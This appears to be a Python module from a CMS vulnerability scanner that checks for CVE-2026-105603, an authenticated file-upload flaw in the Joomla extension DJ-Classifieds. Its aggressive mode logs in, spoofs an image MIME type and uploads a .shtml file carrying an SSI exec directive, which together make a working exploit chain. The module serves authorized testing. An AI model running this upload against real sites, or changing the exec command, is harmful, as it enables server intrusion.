from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.args import aggressive_value
from ...core.http import (
    HttpClient,
    build_multipart,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-105603"
NAME = "DJ-Classifieds authenticated arbitrary file upload"
COMPONENT = "DJ-Classifieds"
AFFECTED_RULE = "DJ-Classifieds 1.0 through 3.11.2; fixed in 3.11.3"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PATH = "/index.php?option=com_users&view=login"
PROFILE_EDIT_PATH = "/index.php?option=com_djclassifieds&view=profileedit"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"')
USER_ID_RE = re.compile(r'name="user_id" value="(\d+)"')


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe("3.11.3")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("djclassifieds", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="DJ-Classifieds was not detected.", action="No action is required unless DJ-Classifieds is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected DJ-Classifieds {version}, within the affected range below 3.11.3."
        action = "Upgrade DJ-Classifieds to 3.11.3 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected DJ-Classifieds {version}, which includes the 3.11.3 real-image-type check."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "DJ-Classifieds was detected, but its version could not be determined."
        action = "Determine the installed DJ-Classifieds version and upgrade to 3.11.3 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{LOGIN_PATH}", timeout=timeout)
    match = TOKEN_RE.search(page.get("body") or "")
    if not match:
        return False
    response = client.request(
        f"{base}/index.php?option=com_users&task=user.login",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({"username": username, "password": password, "return": "", match.group(1): "1"}),
        timeout=timeout,
        follow_redirects=False,
    )
    location = str((response.get("headers") or {}).get("Location") or "")
    return response.get("status") in (301, 302, 303) and "login" not in location.lower()


def _profile_form(client: HttpClient, base: str, timeout: int) -> tuple[str, str] | None:
    page = client.get(f"{base}{PROFILE_EDIT_PATH}", timeout=timeout)
    body = page.get("body") or ""
    if page.get("status") != 200 or "new_avatar" not in body:
        return None
    token = TOKEN_RE.search(body)
    user_id = USER_ID_RE.search(body)
    if not token or not user_id:
        return None
    return token.group(1), user_id.group(1)


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Upload a non-image .shtml file through the profile avatar sink.

    3.11.2 trusts the browser-sent MIME type (``substr($type, 0, 5) === 'image'``)
    and keeps the uploaded extension. Joomla's ``isSafeFile`` blocks PHP-family
    extensions but allows ``.shtml``, so an ordinary registered user can place
    an SSI file in ``components/com_djclassifieds/images/profile/<bucket>/``.
    Execution is server-dependent (SSI/Includes); the module proves the upload
    and reports whether SSI was processed.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{LOGIN_PATH}", detail="The authenticated upload proof needs an ordinary DJ-Classifieds account. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab credentials.")
    client = HttpClient(timeout=timeout, proxy=proxy)
    if not _login(client, base, username, password, timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{LOGIN_PATH}", detail="The front-end login did not establish a session; the avatar upload was not attempted.", action="Verify the lab credentials and the front-end login route.")
    form = _profile_form(client, base, timeout)
    if not form:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{PROFILE_EDIT_PATH}", detail="The DJ-Classifieds profile edit form did not expose the avatar field.", action="Verify the profile-edit menu and permissions on an authorized staging site.")
    token, user_id = form
    marker = f"PROOFCMS_DJC_UPLOAD_{secrets.token_hex(4)}"
    filename = f"proofcms_{secrets.token_hex(4)}.shtml"
    payload = f'<!--#echo var="DOCUMENT_ROOT" -->\n<!--#exec cmd="echo {marker}" -->\n'.encode()
    fields = {
        "option": "com_djclassifieds",
        "view": "profileedit",
        "task": "save",
        "user_id": user_id,
        "u_name": username,
        "u_username": username,
        token: "1",
    }
    content_type, multipart = build_multipart(fields, {"new_avatar": (filename, payload, "image/jpeg")})
    upload = client.request(f"{base}/index.php", method="POST", headers={"Content-Type": content_type}, data=multipart, timeout=timeout, follow_redirects=False)
    if is_transport_error(upload):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail=f"The avatar upload failed in transit ({transport_error_detail(upload)}).", action="Retry when the target is reachable.")
    folder = int(user_id) // 1000
    file_url = f"{base}/components/com_djclassifieds/images/profile/{folder}/{user_id}_{filename}"
    served = client.get(file_url, timeout=timeout)
    body = served.get("body") or ""
    uploaded = not is_transport_error(served) and served.get("status") == 200 and marker in body
    ssi_processed = uploaded and "<!--#exec" not in body
    evidence = {
        "user_id": user_id,
        "filename": filename,
        "upload_status": upload.get("status"),
        "file_url": file_url,
        "marker": marker,
        "file_readable": uploaded,
        "ssi_processed": ssi_processed,
    }
    if uploaded:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                f"An ordinary registered user uploaded the non-image {filename!r} through the profile avatar "
                "field; 3.11.2 kept the .shtml extension and the file is publicly readable. "
                + ("SSI was processed by the server." if ssi_processed else "The lab server served the file as text (SSI/Includes disabled), so code execution is server-dependent.")
            ),
            action="Upgrade DJ-Classifieds to 3.11.3 or newer and remove the uploaded file.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=file_url,
        evidence=evidence,
        detail=f"The upload response was HTTP {upload.get('status')}, but the .shtml file was not readable at the expected profile path (served HTTP {served.get('status') if not is_transport_error(served) else 0}).",
        action="Upgrade affected DJ-Classifieds versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    page = HttpClient(timeout=timeout, proxy=proxy).get(f"{base}{PROFILE_EDIT_PATH}", timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{PROFILE_EDIT_PATH}", detail=f"The profile edit page could not be reached ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
    if page.get("status") == 200 and "new_avatar" in (page.get("body") or ""):
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{PROFILE_EDIT_PATH}", detail="The avatar upload form is reachable; the state-changing upload was not sent in safe mode.", action="Use aggressive mode with an ordinary account on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{PROFILE_EDIT_PATH}", detail="The profile edit form did not expose the avatar field; no proof was attempted.", action="Verify the profile-edit permissions on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because DJ-Classifieds was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (form reachability) and aggressive (authenticated upload) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Unrestricted File Upload", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["djclassifieds"], "references": ["https://www.cve.org/CVERecord?id=CVE-2026-105603", "https://mysites.guru/vulnerabilities/CVE-2026-105603", "https://dj-extensions.com/dj-classifieds"]}
